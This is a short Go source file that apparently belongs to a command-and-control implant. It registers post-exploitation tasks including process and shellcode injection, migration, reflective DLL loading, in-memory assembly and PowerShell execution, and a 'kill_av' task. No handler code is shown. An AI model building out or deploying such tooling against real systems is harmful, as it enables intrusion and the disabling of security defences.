//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "injection" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["inject"] = handleInject
	taskHandlers["inject_methods"] = handleInjectMethods
	taskHandlers["list_inject_methods"] = handleInjectMethods
	taskHandlers["shinject"] = handleShinject
	taskHandlers["shspawn"] = handleShspawn
	taskHandlers["spawn"] = handleSpawn
	taskHandlers["migrate"] = handleMigrate
	taskHandlers["bof"] = handleBOF
	taskHandlers["bof_infection"] = handleBOFInfection
	taskHandlers["execute_assembly"] = handleExecuteAssembly
	taskHandlers["execute_assembly_forkrun"] = handleExecuteAssemblyForkRun
	taskHandlers["powerpick"] = handlePowerPick
	taskHandlers["peloader"] = handlePELoader
	taskHandlers["reflectdll_inject"] = handleReflectDLLInject
	taskHandlers["clr_exec_assembly"] = handleCLRExecAssembly
	taskHandlers["clr_powershell"] = handleCLRPowerShell
	taskHandlers["kill_av"] = handleKillAV
}
